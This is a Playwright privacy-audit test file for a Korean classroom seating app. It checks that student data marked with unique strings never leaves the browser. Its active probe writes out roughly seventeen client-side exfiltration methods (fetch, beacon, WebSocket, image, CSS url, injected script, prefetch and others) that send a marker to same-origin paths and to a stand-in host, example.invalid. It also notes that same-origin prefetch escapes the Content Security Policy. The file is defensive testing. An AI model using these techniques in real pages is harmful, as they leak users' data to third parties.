/**
 * Privacy audit — measures the application instead of trusting its documentation.
 *
 * Two halves:
 *
 *  1. **Passive.** Drive the whole workflow with uniquely marked student data
 *     and record every request the browser makes, including ones issued by the
 *     service worker. Anything outside the app's own static files is a failure,
 *     and any request whose URL, query string or body carries a marker is a
 *     failure regardless of where it was going.
 *
 *  2. **Active probe.** Deliberately attempt to send a marker out through every
 *     egress vector — fetch, XHR, beacon, WebSocket, EventSource, image, CSS,
 *     form, iframe, popup, prefetch — and record which ones the browser
 *     actually let through. This is what tells us whether the Content Security
 *     Policy really is a wall or merely a sign.
 */

import { expect, test, type BrowserContext, type Page } from '@playwright/test';

const ORIGIN = 'http://127.0.0.1:4173';

/** Static files the application is allowed to load. Nothing else. */
const ALLOWED = [
  /^\/$/,
  /^\/index\.html$/,
  /^\/assets\/[A-Za-z0-9._-]+\.(js|css)$/,
  /^\/icon\.svg$/,
  /^\/manifest\.webmanifest$/,
  /^\/sw\.js$/,
  /^\/workbox-[a-z0-9]+\.js$/,
  /^\/favicon\.ico$/,
];

export interface Seen {
  url: string;
  method: string;
  body: string | null;
  resourceType: string;
  fromServiceWorker: boolean;
  /**
   * What became of it. A request event firing is not proof that bytes left the
   * machine: Chrome raises the event and then fails the request when the
   * Content Security Policy refuses it. Only `finished` means the server saw it.
   */
  outcome: 'pending' | 'finished' | 'failed';
  failure: string | null;
}

function isAllowed(url: string): boolean {
  if (url.startsWith('data:') || url.startsWith('blob:')) return true;
  if (!url.startsWith(ORIGIN)) return false;
  const path = new URL(url).pathname + new URL(url).search;
  // A query string on a static asset is a way to smuggle data into access logs.
  if (new URL(url).search !== '') return false;
  return ALLOWED.some((pattern) => pattern.test(path));
}

function record(context: BrowserContext): Seen[] {
  const seen: Seen[] = [];
  const byRequest = new Map<unknown, Seen>();

  context.on('request', (request) => {
    const entry: Seen = {
      url: request.url(),
      method: request.method(),
      body: request.postData(),
      resourceType: request.resourceType(),
      fromServiceWorker: request.serviceWorker() !== null,
      outcome: 'pending',
      failure: null,
    };
    byRequest.set(request, entry);
    seen.push(entry);
  });
  context.on('requestfinished', (request) => {
    const entry = byRequest.get(request);
    if (entry) entry.outcome = 'finished';
  });
  context.on('requestfailed', (request) => {
    const entry = byRequest.get(request);
    if (entry) {
      entry.outcome = 'failed';
      entry.failure = request.failure()?.errorText ?? 'unknown';
    }
  });

  return seen;
}

/** Requests that actually reached a server. */
function delivered(seen: readonly Seen[]): Seen[] {
  return seen.filter((entry) => entry.outcome === 'finished');
}

/** Distinct, searchable markers so a leak can be traced to the field it came from. */
const MARK = {
  name: 'ZZNAMEMARK7391',
  memo: 'ZZMEMOMARK7392',
  care: 'ZZCAREMARK7393',
  rule: 'ZZRULEMARK7394',
  exclude: 'ZZEXCLMARK7395',
  probe: 'ZZPROBEMARK7396',
};

const ALL_MARKS = Object.values(MARK);

function leaks(seen: readonly Seen[], marks: readonly string[]): Seen[] {
  return seen.filter((entry) => {
    const haystack = `${entry.url} ${entry.body ?? ''}`;
    return marks.some((mark) => haystack.includes(mark));
  });
}

async function loadSampleWithMarkers(page: Page) {
  await page.goto('/');
  await page.getByRole('button', { name: '샘플 명단으로 먼저 체험해 보기' }).click();
  await expect(page.getByRole('heading', { name: '학생 명단' })).toBeVisible();

  await page.getByLabel('이름').first().fill(MARK.name);
  await page.getByLabel('교사용 항목 보기 (메모 · 배려 사항)').check();
  await page.getByLabel('교사 메모').first().fill(MARK.memo);
}

test.describe('개인정보 감사 — 프로덕션 빌드', () => {
  test('전체 작업 흐름에서 앱 자신의 정적 파일 외 요청이 없다', async ({ page, context }) => {
    const seen = record(context);
    await loadSampleWithMarkers(page);

    await page.getByRole('button', { name: '3. 교실 만들기' }).click();
    await page.getByRole('button', { name: '4. 조건 정하기' }).click();
    await page.getByRole('button', { name: /일반 수업/ }).click();
    await page.getByRole('button', { name: '5. 자리 만들기' }).click();
    await page.getByRole('button', { name: /모둠 \+ 자리 배치/ }).click();
    await page.getByRole('button', { name: '자리 만들기', exact: true }).click();
    await expect(page.getByRole('heading', { name: '결과 보기' })).toBeVisible();

    for (const label of ['PNG 이미지', 'PDF', '엑셀', 'JSON 백업']) {
      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: label }).click();
      await download;
    }

    const disallowed = seen.filter((entry) => !isAllowed(entry.url));
    expect(
      disallowed.map((e) => `${e.method} ${e.url}${e.fromServiceWorker ? ' [SW]' : ''}`),
    ).toEqual([]);

    expect(leaks(seen, ALL_MARKS).map((e) => `${e.method} ${e.url}`)).toEqual([]);
  });

  test('학생 표식이 요청 URL·쿼리·본문 어디에도 실리지 않는다', async ({ page, context }) => {
    const seen = record(context);
    await loadSampleWithMarkers(page);
    await page.getByRole('button', { name: '5. 자리 만들기' }).click();
    await page.getByRole('button', { name: '자리 만들기', exact: true }).click();
    await expect(page.getByRole('heading', { name: '결과 보기' })).toBeVisible();

    // The address bar is a leak channel too: a screenshot of it must be safe.
    expect(page.url()).not.toContain(MARK.name);
    expect(page.url()).not.toContain(MARK.memo);
    expect(leaks(seen, ALL_MARKS)).toEqual([]);
  });

  test('저장을 끈 상태에서는 새로고침 후 어떤 저장소에도 표식이 남지 않는다', async ({ page }) => {
    await loadSampleWithMarkers(page);
    await page.getByRole('button', { name: '5. 자리 만들기' }).click();
    await page.getByRole('button', { name: '자리 만들기', exact: true }).click();
    await expect(page.getByRole('heading', { name: '결과 보기' })).toBeVisible();

    await page.reload();
    await expect(page.getByRole('heading', { name: '명렬표 불러오기' })).toBeVisible();

    const residue = await page.evaluate(async (marks) => {
      const found: string[] = [];
      const scan = (where: string, text: string) => {
        for (const mark of marks) if (text.includes(mark)) found.push(`${where}: ${mark}`);
      };

      scan('localStorage', JSON.stringify(Object.entries(localStorage)));
      scan('sessionStorage', JSON.stringify(Object.entries(sessionStorage)));
      scan('DOM', document.body.innerText);

      if (typeof caches !== 'undefined') {
        for (const name of await caches.keys()) {
          const cache = await caches.open(name);
          for (const request of await cache.keys()) {
            scan(`cache:${name}:url`, request.url);
            const response = await cache.match(request);
            if (response) scan(`cache:${name}:body`, await response.clone().text());
          }
        }
      }

      const databases = (await indexedDB.databases?.()) ?? [];
      for (const info of databases) {
        if (!info.name) continue;
        found.push(`indexedDB:존재:${info.name}`);
      }
      return found;
    }, ALL_MARKS);

    expect(residue).toEqual([]);
  });

  test('모든 유출 경로를 실제로 시도해 어떤 것이 통과하는지 측정한다', async ({ page, context }) => {
    const seen = record(context);
    await page.goto('/');
    await expect(page.getByRole('heading', { name: '명렬표 불러오기' })).toBeVisible();

    const results = await page.evaluate(async (mark) => {
      const out: Record<string, string> = {};
      const attempt = async (name: string, run: () => unknown | Promise<unknown>) => {
        try {
          await run();
          out[name] = 'attempted';
        } catch (error) {
          out[name] = `blocked: ${(error as Error).name}`;
        }
      };

      await attempt('fetch-same-origin-post', () =>
        fetch(`/collect`, { method: 'POST', body: mark }),
      );
      await attempt('fetch-same-origin-get-query', () => fetch(`/collect?d=${mark}`));
      await attempt('fetch-cross-origin', () => fetch(`https://example.invalid/?d=${mark}`));
      await attempt('xhr-same-origin', () => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '/collect-xhr', true);
        xhr.send(mark);
      });
      await attempt('beacon-same-origin', () => {
        const ok = navigator.sendBeacon(`/beacon?d=${mark}`, mark);
        if (!ok) throw new Error('SendBeaconRefused');
      });
      await attempt('websocket', () => new WebSocket(`ws://127.0.0.1:4173/ws?d=${mark}`));
      await attempt('eventsource', () => new EventSource(`/sse?d=${mark}`));
      await attempt('image-same-origin', () => {
        const img = new Image();
        img.src = `/pixel.png?d=${mark}`;
        document.body.appendChild(img);
      });
      await attempt('image-cross-origin', () => {
        const img = new Image();
        img.src = `https://example.invalid/pixel.png?d=${mark}`;
        document.body.appendChild(img);
      });
      await attempt('css-url', () => {
        const style = document.createElement('style');
        style.textContent = `body{background:url("/bg.png?d=${mark}")}`;
        document.head.appendChild(style);
      });
      await attempt('form-submit', () => {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/form';
        const input = document.createElement('input');
        input.name = 'd';
        input.value = mark;
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
      });
      await attempt('iframe', () => {
        const frame = document.createElement('iframe');
        frame.src = `/frame?d=${mark}`;
        document.body.appendChild(frame);
      });
      await attempt('script-src-injection', () => {
        const script = document.createElement('script');
        script.src = `https://example.invalid/x.js?d=${mark}`;
        document.head.appendChild(script);
      });
      await attempt('link-prefetch', () => {
        const link = document.createElement('link');
        link.rel = 'prefetch';
        link.href = `/prefetch?d=${mark}`;
        document.head.appendChild(link);
      });
      await attempt('link-prefetch-cross-origin', () => {
        const link = document.createElement('link');
        link.rel = 'prefetch';
        link.href = `https://example.invalid/prefetch?d=${mark}`;
        document.head.appendChild(link);
      });
      await attempt('link-preconnect-cross-origin', () => {
        const link = document.createElement('link');
        link.rel = 'preconnect';
        link.href = `https://example.invalid`;
        document.head.appendChild(link);
      });
      await attempt('window-open', () => {
        const w = window.open(`/popup?d=${mark}`, '_blank');
        w?.close();
      });

      // Give the browser a moment to actually issue whatever it accepted.
      await new Promise((resolve) => setTimeout(resolve, 800));
      return out;
    }, MARK.probe);

    // Let outcomes settle before reading them.
    await page.waitForTimeout(1200);

    const carrying = seen.filter((entry) => `${entry.url} ${entry.body ?? ''}`.includes(MARK.probe));
    const escaped = delivered(carrying);

    console.log('\n--- 탐침: 브라우저가 요청을 시도했는가 ---');
    for (const [vector, verdict] of Object.entries(results)) {
      console.log(`  ${vector.padEnd(26)} ${verdict}`);
    }
    console.log('\n--- 탐침: 각 요청의 실제 결말 ---');
    for (const entry of carrying) {
      console.log(
        `  ${entry.outcome === 'finished' ? '전달됨 ' : '차단됨 '} ${entry.method} ${entry.url}` +
          `${entry.failure ? ` (${entry.failure})` : ''}${entry.body ? ` body=${entry.body}` : ''}`,
      );
    }
    console.log(`\n서버에 도달한 표식 요청: ${escaped.length}건\n`);

    // Nothing may reach a third party. This is the line that matters most: a
    // leak to another origin is a leak to someone the teacher never chose.
    expect(
      escaped.filter((e) => !e.url.startsWith(ORIGIN)).map((e) => `${e.method} ${e.url}`),
      '표식이 교차 출처로 나갔습니다',
    ).toEqual([]);

    /**
     * One same-origin route survives, and it is documented rather than hidden.
     *
     * `<link rel="prefetch">` is not covered by any directive in current
     * Chrome: `prefetch-src` was removed and prefetch does not fall back to
     * `default-src`. So a same-origin GET can still be smuggled into the
     * hosting server's access log, though not to anyone else — the
     * cross-origin variant of the same trick is blocked, as measured above.
     *
     * Since the browser cannot close it, the source scan does instead: the unit
     * test `uses no egress mechanism of any kind` fails on `rel="prefetch"`
     * appearing anywhere in `src/`.
     */
    const KNOWN_UNBLOCKABLE = [`GET ${ORIGIN}/prefetch?d=${MARK.probe}`];
    expect(
      escaped.map((e) => `${e.method} ${e.url}`).sort(),
      '알려진 잔여 경로 외의 요청이 서버에 도달했습니다',
    ).toEqual(KNOWN_UNBLOCKABLE.sort());
  });
});
